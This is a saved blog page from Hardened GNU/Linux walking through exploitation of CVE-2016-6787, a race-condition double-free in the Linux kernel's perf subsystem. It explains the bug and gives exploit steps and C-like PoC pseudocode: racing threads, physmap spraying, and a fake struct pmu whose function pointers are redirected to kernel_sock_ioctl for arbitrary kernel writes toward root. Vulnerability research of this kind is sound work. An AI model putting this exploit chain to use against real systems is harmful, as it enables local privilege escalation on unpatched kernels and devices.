<!DOCTYPE html>
<!-- saved from url=(0091)https://hardenedlinux.github.io/system-security/2017/10/16/Exploiting-on-CVE-2016-6787.html -->
<html class=" wf-source-han-sans-simplified-c-n7-active wf-source-han-sans-simplified-c-n1-active wf-source-han-sans-simplified-c-n4-active wf-active"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="Content-Security-Policy" content="Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;self&#39; &#39;sha256-5kMb497w7ItxXRHeDONhgk1HOjOqzAVeP4/0KPiMW0Y=&#39; &#39;sha256-tTF1yX+RjpAH9BXtHp0JAHdFvbp+J0ug0F5JFBf4nyM=&#39; https://use.typekit.net https://www.google-analytics.com; style-src &#39;self&#39; &#39;unsafe-inline&#39;; img-src &#39;self&#39; https://p.typekit.net https://www.google-analytics.com https://hackadaycom.files.wordpress.com; font-src &#39;self&#39; https://use.typekit.net data://*; connect-src https://use.typekit.net https://p.typekit.net; frame-ancestors &#39;none&#39;; form-action &#39;none&#39;; base-uri hardenedlinux.github.io; upgrade-insecure-requests; block-all-mixed-content;">
  <meta http-equiv="Referrer-Policy" content="no-referrer, no-referrer-when-downgrade, strict-origin-when-cross-origin">
  
  <title>Exploiting on CVE-2016-6787</title>

  <meta name="description" content="Exploiting on CVE-2016-6787Abstractperf is a complex system in linux kernel, and exists other vulnerabilities like CVE-2013-2094.Di Shen, a member of Keen Te...">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

  <link rel="shortcut icon" href="https://hardenedlinux.github.io/favicon.ico">

  <link rel="stylesheet" href="./2017 - Exploiting on CVE-2016-6787_files/style.css">

  <link rel="canonical" href="http://www.hardenedlinux.org/system-security/2017/10/16/Exploiting-on-CVE-2016-6787.html">
  <link rel="alternate" type="application/rss+xml" title="Hardened GNU/Linux" href="http://www.hardenedlinux.org/feed.xml">

<script async="" src="./2017 - Exploiting on CVE-2016-6787_files/analytics.js.下載"></script><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-1566884-2', 'auto');
  ga('send', 'pageview');

</script>
<style>.tk-source-han-sans-simplified-c{font-family:"source-han-sans-simplified-c",sans-serif;}</style></head>
 
<body class="post-template tag-text tag-formatting tag-list tag-images-2">
<div class="site-main">
        <header class="site-header">
    <a href="https://hardenedlinux.github.io/system-security/2017/10/16/Hardened%20GNU/Linux"><img class="blog-logo" src="./2017 - Exploiting on CVE-2016-6787_files/logo_400.png" alt="Blog Logo"></a>
    <h1 class="blog-title"><a href="http://www.hardenedlinux.org/">Hardened GNU/Linux</a></h1>
    <h2 class="blog-description">We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!! A small step in security hardening --&gt; A giant leap in Free &amp; Open source software!!!
</h2>
    <ul class="nav">
        <li class="nav-home" role="presentation">
	    <a href="http://www.hardenedlinux.org/">Home</a>
	</li>
        <li class="nav-about" role="presentation">
	    <a href="http://www.hardenedlinux.org/about">About</a>
	</li>
        <li class="nav-about" role="presentation">
	    <a href="http://www.hardenedlinux.org/about2">Contribution</a>
	</li>
    </ul>
</header>
 
        <div class="site-content" role="main">
    <article class="post tag-text tag-formatting tag-list"> 
        <header class="post-header">
	    <h1 class="post-title">Exploiting on CVE-2016-6787</h1>
	    <span class="post-meta">
	       Post on <time datetime="2017-10-16">16 October 2017</time>
	    </span>
	</header>
	<section class="post-content">
	    <h1 id="exploiting-on-cve-2016-6787"><a href="https://github.com/hardenedlinux/hardenedlinux.github.io/blob/master/_posts/2017-10-16-Exploiting-on-CVE-2016-6787.md">Exploiting on CVE-2016-6787</a></h1>
<h2 id="abstract">Abstract</h2>
<p>perf is a complex system in linux kernel, 
and exists other vulnerabilities like <code class="language-plaintext highlighter-rouge">CVE-2013-2094</code>.
Di Shen, a member of Keen Team, presetated a parper (<code class="language-plaintext highlighter-rouge">Defeating Samsung KNOX with zero
privilege</code>)[1] that mentioned <code class="language-plaintext highlighter-rouge">CVE-2016-6787</code>[2].</p>

<h2 id="analysis-of-cve-2016-6787">Analysis of CVE-2016-6787</h2>
<p>This is a double-free vulnerability.
The vulnerable object is <code class="language-plaintext highlighter-rouge">struct perf_event_context</code>. Review below code firstly, the mainly bug is in the <code class="language-plaintext highlighter-rouge">if(move_group)</code> statement; thus set move_group to 1 is necessary.
We will talk about how to set the variable <code class="language-plaintext highlighter-rouge">move_group</code> up in later section.</p>

<p>Assume that the <code class="language-plaintext highlighter-rouge">move_group</code> has been set 1, we look at the <code class="language-plaintext highlighter-rouge">put_ctx(gctx)</code> at the 20 line of <code class="language-plaintext highlighter-rouge">Code snippet 1</code>, it lacks a locker to protect it when two threads run simultaneously.</p>

<p><code class="language-plaintext highlighter-rouge">put_ctx(gctx)</code> makes gctx-&gt;refcount minus one, then checks that refcount equals zero whether or not. If <code class="language-plaintext highlighter-rouge">gctx-&gt;refcount</code> equals zero, it’ll be free.</p>

<pre><code class="language-c=">// Code snippet 1
if (move_group) {
    struct perf_event_context *gctx = group_leader-&gt;ctx;

    mutex_lock(&amp;gctx-&gt;mutex);
    perf_remove_from_context(group_leader, false);

    /*
     * Removing from the context ends up with disabled
     * event. What we want here is event in the initial
     * startup state, ready to be add into new context.
     */
    perf_event__state_init(group_leader);
    list_for_each_entry(sibling, &amp;group_leader-&gt;sibling_list,
                group_entry) {
        perf_remove_from_context(sibling, false);
        perf_event__state_init(sibling);
        put_ctx(gctx);
    }
    mutex_unlock(&amp;gctx-&gt;mutex);
    put_ctx(gctx);
}

WARN_ON_ONCE(ctx-&gt;parent_ctx);
mutex_lock(&amp;ctx-&gt;mutex);

if (move_group) {
    synchronize_rcu();
    perf_install_in_context(ctx, group_leader, group_leader-&gt;cpu);
    get_ctx(ctx);
    list_for_each_entry(sibling, &amp;group_leader-&gt;sibling_list,
                group_entry) {
        perf_install_in_context(ctx, sibling, sibling-&gt;cpu);
        get_ctx(ctx);
    }
}
//http://elixir.free-electrons.com/linux/v3.18.20/source/kernel/events/core.c#L7290
</code></pre>
<p>So, we could create at least two threads for racing.</p>
<h4 id="how-about-move_group">How about <code class="language-plaintext highlighter-rouge">move_group</code></h4>
<p>As the comment in the below code(<code class="language-plaintext highlighter-rouge">Code snippet 2</code>) from line 12 to line 16, if <code class="language-plaintext highlighter-rouge">group_leader</code> is a pure software group, and we try add a hardware event, then it’ll move all events in the group to the hardware context.</p>

<pre><code class="language-c=">// Code snippet 2
SYSCALL_DEFINE5(perf_event_open,
        struct perf_event_attr __user *, attr_uptr,
        pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
{
	...
    	if (group_leader &amp;&amp;
	    (is_software_event(event) != is_software_event(group_leader))) {
		if (is_software_event(event)) {
			pmu = group_leader-&gt;pmu;
		} else if (is_software_event(group_leader) &amp;&amp;
			   (group_leader-&gt;group_flags &amp; PERF_GROUP_SOFTWARE)) {
     		        /*
			 * In case the group is a pure software group, and we
			 * try to add a hardware event, move the whole group to
			 * the hardware context.
			 */
			move_group = 1;
		}
	}
//http://elixir.free-electrons.com/linux/v3.18.20/source/kernel/events/core.c
</code></pre>
<p>So we know that if <code class="language-plaintext highlighter-rouge">move_group</code> equals one then all events in the group of software-context move into hardware-context according to <code class="language-plaintext highlighter-rouge">code snippet 1</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        +-----------------------+                  +-----------------------+
        |    software-context   |                  |    hardware-context   |
        |-----------------------|  if(move_group   |-----------------------|
        | +------------------+  |     == 1)        |                       |
        | | struct perf_event|  |                  |                       |
        | |------------------|  | +------------&gt;   |                       |
        | | group_leader     |  |                  |                       |
        | |                  |  |                  |                       |
        | +------------------+  |                  |                       |
        | ...                   |                  |                       |
        +-----------------------+                  +-----------------------+
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h4 id="trigger-the-vulnerability">Trigger the vulnerability</h4>
<ul>
  <li>
    <p><strong>Thread_1</strong> for allocation:
We create group_leader thread through <code class="language-plaintext highlighter-rouge">perf_event_open()</code> with <code class="language-plaintext highlighter-rouge">PERF_TYPE_SOFTWARE</code> type and <code class="language-plaintext highlighter-rouge">PERF_FLAG_FD_OUTPUT</code> flag, and then go to sleep via <code class="language-plaintext highlighter-rouge">futex()</code>.</p>

    <p>You will get a <code class="language-plaintext highlighter-rouge">group_fd</code> from above <code class="language-plaintext highlighter-rouge">perf_event_open()</code> systemc call.</p>

    <p>The variable (group_fd) will be used by Thread_2 and Thread_3.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   struct perf_event_attr attr = { 0 };
   attr.type = 1; //PERF_TYPE_SOFTWARE;
   attr.config = 3LL;  //PERF_COUNT_HW_CACHE_MISSES;
   attr.size = 96;//sizeof attr;
   pid = syscall(178);
   group_fd = perf_event_open(&amp;attr, pid, 0xffffffffLL, -1LL, 2LL);
</code></pre></div>    </div>
    <p>gctx-&gt;refconunt = 1, <code class="language-plaintext highlighter-rouge">find_get_context() -&gt; alloc_perf_context() -&gt; __perf_event_init_context(struct perf_event_context *ctx) -&gt; atomic_set(&amp;ctx-&gt;refcount, 1);</code></p>
  </li>
  <li>
    <p><strong>Thread_2 and Thread_3</strong> for free:</p>

    <p>Invoking <code class="language-plaintext highlighter-rouge">perf_event_open(&amp;attr, 0, 0, group_fd, 0)</code> with <code class="language-plaintext highlighter-rouge">PERF_TYPE_HARDWARE</code> in thread_2 and thread_3, we will set up move_group to one and racing.</p>
    <h4 id="open-pandoras-box">Open Pandora’s box</h4>
  </li>
</ul>

<p>The kernel does not crash directly after trigger this bug.
Therefore, we can do physmap-based spraying on <code class="language-plaintext highlighter-rouge">struct perf_event_context</code>.[5]
After above threads go to sleep via <code class="language-plaintext highlighter-rouge">futex()</code>, the kernel scheduler will execute 
<code class="language-plaintext highlighter-rouge">perf_event_context_sched_in()</code> that leads to kernel crash.</p>

<pre><code class="language-c=">// Code snippet 3
static void perf_event_context_sched_in(struct perf_event_context *ctx,
					struct task_struct *task)
{
	struct perf_cpu_context *cpuctx;

	cpuctx = __get_cpu_context(ctx);
	if (cpuctx-&gt;task_ctx == ctx)
		return;

	perf_ctx_lock(cpuctx, ctx);
	perf_pmu_disable(ctx-&gt;pmu); 
	// be hijacked, then go to kernel_sock_ioctl(), set addr_limit = -1.

	if (!list_empty(&amp;ctx-&gt;pinned_groups))
		cpu_ctx_sched_out(cpuctx, EVENT_FLEXIBLE);
	perf_event_sched_in(cpuctx, ctx, task);
	perf_pmu_enable(ctx-&gt;pmu);
	// be hijacked, launch ret intruction directly.
	perf_ctx_unlock(cpuctx, ctx);
}
</code></pre>

<p>Our goal is to get the root not just crash, so we need to make a fake <code class="language-plaintext highlighter-rouge">struct pmu</code> in
re-filled <code class="language-plaintext highlighter-rouge">struct perf_event_context</code>. By the way, the <code class="language-plaintext highlighter-rouge">struct pmu</code> contains some functions pointer we can hijack. 
Look out the <code class="language-plaintext highlighter-rouge">struct pmu</code>, do you feel excited?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct pmu {
    ...

	int * __percpu			pmu_disable_count;
	struct perf_cpu_context * __percpu pmu_cpu_context;
	int				task_ctx_nr;
	int				hrtimer_interval_ms;

	/*
	 * Fully disable/enable this PMU, can be used to protect from the PMI
	 * as well as for lazy/batch writing of the MSRs.
	 */
	void (*pmu_enable)		(struct pmu *pmu); /* optional */
	void (*pmu_disable)		(struct pmu *pmu); /* optional */
    ...
</code></pre></div></div>
<p>According to <code class="language-plaintext highlighter-rouge">Code snippet 3</code> , we could fill the address of <code class="language-plaintext highlighter-rouge">kernel_sock_ioctl</code> instead of the original address of <code class="language-plaintext highlighter-rouge">pmu_disable</code>. Because <code class="language-plaintext highlighter-rouge">kernel_sock_ioctl</code> can help us to enable write kernel space arbitrarily. 
<code class="language-plaintext highlighter-rouge">kernel_setsockopt()</code> is the another function such as this one.
Suppose that we can execute the <code class="language-plaintext highlighter-rouge">kernel_sock_ioctl()</code> and control its 1st argument（<code class="language-plaintext highlighter-rouge">struct socket *sock</code>）, then can jump over the <code class="language-plaintext highlighter-rouge">set_fs(oldfs)</code> to <code class="language-plaintext highlighter-rouge">kernel_sock_ioctl</code> epilogue by manipulating <code class="language-plaintext highlighter-rouge">struct socket *sock</code>.
By the way, we also fill some hard-core addresses to avoid crash and guarante writing kernel space successfully.</p>

<p>You can get more details in later POC code section.</p>

<pre><code class="language-c=">int kernel_sock_ioctl(struct socket *sock, int cmd, unsigned long arg)
{
	mm_segment_t oldfs = get_fs();
	int err;

	set_fs(KERNEL_DS);
	err = sock-&gt;ops-&gt;ioctl(sock, cmd, arg);
	set_fs(oldfs);

	return err;
}
</code></pre>

<p>If you could write kernel space arbitrarily and get some infoleak, it almost equals to get root privilege.
There are a lot of poc or exploit on the internet, so we don’t talk it more here.</p>
<h2 id="poc-pseudocode">PoC pseudocode</h2>
<p>Below poc only set up the addr_limit for writing kernel.</p>
<pre><code class="language-c=">static void init_pmu(unsigned long pmu)
{
    // Refer to `struct pmu` in include/linux/perf_event.h. 
    *(unsigned long*)(pmu + 64) = 
        loc_per_cpu_start;	  
        // pmu-&gt;pmu_cpu_context. Avoid crash.
    *(unsigned long*)(pmu + 96) = 
        loc_kernel_sock_ioctl;      
        // pmu-&gt;pmu_disable, function pointer, pointing to kernel_sock_ioctl
    *(unsigned long*)(pmu + 56) = 
        loc_per_cpu_start;      
        // pmu-&gt;pmu_disable_conut, , pointing to _per_cpu_start
    *(unsigned long*)(pmu + 88) = 
        loc_direct_ret; 
        // pmu-&gt;pmu_enable, (function pointer)
                                
    *(unsigned long*)(pmu + 40) = pmu + 0x100;
        // == *sock-&gt;ops, for hijacking sock-&gt;ops-&gt;ioctl
    *(unsigned long*)(pmu + 328) = 
        loc_kernel_sock_ioctl_ret;
        // == *sock-&gt;ops-&gt;ioctl, for hijacking sock-&gt;ops-&gt;ioctl, = kernel_sock_ioctl_ret
}
void phymaps_spray()
{
    /*  Here we phymaps_spray the fake `struct perf_event_context` 
     *  pointing fake pmu we puted in user space.
     */
  while ( start_addr &lt; ret2dir_limit )
  {
    addr = mmap((void*)start_addr, alloc_size);

    while ( addr &lt; addr + alloc_size )
    {
      // Refer to struct `perf_event_context` in include/linux/perf_event.h.   
      *(unsigned long*)addr = pmu_addr;
      addr += 512LL;
    }
    mlock(addr, alloc_size);
    start_addr += alloc_size;
  }
}
void prepare()
{
    pmu_addr = mmap(pmu_address) // you mmap a memory range in user space.
    init_pmu(pmu_addr); // init the fake pmu 
    lift_spray();
}
void *thread_1_for_alloc()
{
    group_id = perf_event_open(pid, PERF_TYPE_SOFTWARE);
    sem_post(&amp;sem);
    futex(FUTEX_WAIT_REQUEUE_PI); // wait for waking up.
    
    if (read_at_address_pipe(Kernel_space))	
			puts("Turn UAF bug to arbitrary read/write memory");
    /* While exploit execute here, representing you can read/write arbitrary memory.
     * it's convenient to get the root priv. just like `towelroot`.
     */
}
void *thread_for_free()
{
    perf_event_open(pid, PERF_TYPE_HARDWARE, group_id);
    sem_post(&amp;sem);
    futex() // go to sleep.
}
int trigger()
{
    thread_create(thread_1_for_alloc);
    thread_create(thread_for_free);
    thread_create(thread_for_free);
    
    sem_wait(&amp;sem);
    sem_wait(&amp;sem);
    sem_wait(&amp;sem);
    stop_lift_spray();
    
    phymaps_spray();
    
    futex(FUTEX_CMP_REQUEUE_PI); /* wake up thread_1_for_alloc */
}
void main()
{
    prepare();
    trigger();
}

</code></pre>
<h2 id="reference">Reference</h2>
<p>[1] Defeating Samsung KNOX with zero
privilege
https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf</p>

<p>[2] perf: protect group_leader from races that cause ctx
https://patchwork.kernel.org/patch/9499761/</p>

<p>[3] samsung s7 source code 
https://github.com/jcadduono/android_kernel_samsung_msm8996.git</p>

<p>[4] perf: protect group_leader from races that cause ctx double-free
https://android.googlesource.com/kernel/msm/+/5b87e00be9ca28ea32cab49b92c0386e4a91f730%5E!/</p>

<p>[5] From Collision To Exploitation: Unleashing Use-After-Free Vulnerabilities in Linux Kernel
http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20From%20collision%20to%20exploitation%3A%20Unleashing%20Use-After-Free%20vulnerabilities%20in%20Linux%20Kernel.pdf</p>

	</section>
	<section class="post-footer">
	    <div class="post-tags">
	        Tagged with: system-security
	    </div>
	</section>
    </article>
</div>
 
        <footer class="site-footer">
    <a href="https://github.com/hardenedlinux"><i class="fa fa-github-alt fa-2x"></i></a>
    <a href="mailto:contact@hardenedlinux.org"><i class="fa fa-envelope fa-2x"></i></a>
    <a href="https://twitter.com/hardenedlinux"><i class="fa fa-twitter fa-2x"></i></a>
    <a href="https://groups.google.com/forum/#!forum/hardenedlinux"><i class="fa fa-google fa-2x"></i></a>
    <div class="inner">
        <section class="copyright">This theme copyright by <a href="http://scotthsmith.com/">Scott Smith</a></section>
    </div>
</footer>
 
</div>
<script src="./2017 - Exploiting on CVE-2016-6787_files/qdi5fpu.js.下載"></script>
<script>try{Typekit.load({ async: true });}catch(e){}</script>


</body></html>